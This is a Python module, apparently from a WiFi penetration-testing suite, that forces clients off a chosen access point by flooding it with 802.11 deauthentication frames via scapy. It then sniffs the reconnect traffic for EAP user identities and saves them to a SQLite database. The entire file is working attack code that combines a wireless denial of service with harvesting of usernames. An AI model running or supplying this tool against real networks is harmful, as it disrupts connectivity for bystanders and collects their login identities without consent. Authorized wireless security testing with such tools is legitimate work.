# Module: eapenum.py
# Description: Enumerates insecure Extensible Authentication Protocol (EAP) user identities.
# The Eapenum module will perform a deauthentication attack against a single access point/BSSID,
# while client probes attempt to reconnect Eapenum will sniff insecure EAP user identities.
# Author(s): Nick Sanzotta / Bill Harshbarger
# Version: v 1.05162017

try:
	import os, sys, threading
	from scapy.all import *
	from theme import *
except Exception as e:
	print('\n [!] ERROR: ' + str(e))
	sys.exit(1)

# Database
from dbcommands import DB
# Database connection
# CHECK: needs to be relocated, used while testing database.py
import sqlite3
try:
     # Connect to Database 
     # ISSUE/TEMP hardcoded db_path
     conn = sqlite3.connect('data/WiFiSuite.db', check_same_thread=False) # KEEP Thread Support
     conn.text_factory = str # KEEP Interpret 8-bit bytestrings 
     conn.isolation_level = None # KEEP Autocommit Mode
     db = DB(conn)
except Exception as e:
     print(red('!') + 'Could not connect to database: ' +str(e))
     sys.exit(1)

# Do not move into class
identities = set()

# CHECK if this is needed still?
bssid = set()

class eapEnum(threading.Thread):
	def __init__(self, apmac, broadcastMac, timeout, deauthPktCount, interface, channel):
		threading.Thread.__init__(self)
		self.setDaemon(0) # Thread is not a daemon
		self.apmac = apmac
		self.broadcastMac = broadcastMac
		self.timeout = timeout # must be >0, if you choose not to include a timeout the args must me removed.
		self.deauthPktCount = deauthPktCount
		self.interface = interface
		self.channel = channel
		self.counter = 0
		self.userDict = {}
		self.wifiDict = {}
		self.future = time.time()+10 
		self.deauthPacket = RadioTap()/Dot11(type=0,subtype=12,addr1=self.broadcastMac,addr2 = self.apmac, addr3 = self.apmac)/Dot11Deauth(reason=7)
		self.wirelessInt = str(self.interface.get_ifname())
		

	def monitor_start(self):
		os.system('ifconfig ' + self.wirelessInt + ' down')
		os.system('iwconfig ' + self.wirelessInt + ' mode managed')
		os.system('ifconfig ' + self.wirelessInt + ' up')
		os.system('iwconfig ' + self.wirelessInt + ' channel ' + str(self.channel))
		os.system('ifconfig ' + self.wirelessInt + ' down')
		os.system('iwconfig ' + self.wirelessInt + ' mode monitor')
		os.system('ifconfig ' + self.wirelessInt + ' up')
		return

	def monitor_stop(self):
		os.system('ifconfig ' + self.wirelessInt + ' down')
		os.system('iwconfig ' + self.wirelessInt + ' mode monitor')
		os.system('ifconfig ' + self.wirelessInt + ' up')
		os.system('ifconfig ' + self.wirelessInt + ' down')
		os.system('iwconfig ' + self.wirelessInt + ' mode managed')
		os.system('ifconfig ' + self.wirelessInt + ' up')
		return

	def deauth(self):
		print(blue('i') + '%s is sending %s deauthentication packets to %s' % (self.wirelessInt, self.deauthPktCount, self.apmac))
		# Building packet: addr1 is target (all FF, addr2/3 are the target AP, can be pulled from db)
		for i in range(self.deauthPktCount):
			self.deauthPacket = RadioTap()/Dot11(type=0,subtype=12,addr1=self.broadcastMac,addr2 = self.apmac, addr3 = self.apmac)/Dot11Deauth(reason=7)
			time.sleep(0.1)
		# Send packet for the deauth
		try:
			for i in range(int(self.deauthPktCount)):
				sendp(self.deauthPacket, iface = self.wirelessInt, inter = .2, verbose=False)
		except Exception as e:
			print(red('!') + 'Error sending deauth packets: %s' % e)

	def packethandler(self, pkt):
		essid = 'RadiusX'
		# clients=[]
		# bssid=set()
		# mgmtFrameTypes = (0,2,4)
		# dataFrameSubTypes = ()
		if pkt.haslayer(EAP):
			# Filter out value: None and duplicate identities.
			if pkt.getlayer(EAP).identity != None and (pkt.getlayer(EAP).identity not in identities):
				identity = pkt.getlayer(EAP).identity
				# Append to set: identities
				identities.add(identity)
				# STDOUT
				print(identity)
				# Commit to database
				db.identity_commit(identity, essid)

	def sniff_identities(self):
		self.monitor_start()
		# time.sleep(.5) # CHECK: probably can be removed, used while testing
		cls()
		banner()
		self.deauth()
		print(blue('i') + 'Interface locked on channel: ' + str(self.channel))
		print(blue('i') + 'Sniffing on %s for the next %s seconds.' % (self.wirelessInt,str(self.timeout)))
		print(green('*') + 'Capturing identities: ')
		sniff(iface=self.wirelessInt, timeout=self.timeout, prn=self.packethandler, count=0)
		print(blue('i') + str(self.timeout) + ' seconds has exceeded: ')
		# time.sleep(.5) # CHECK: probably can be removed, used while testing
		self.monitor_stop()

	def run(self):
		# Database check
		# createdb.dbcheck() # CHECK: can probably be removed will add to sanity check script
		self.sniff_identities()
		# TO DO: Add to Queue and end thread
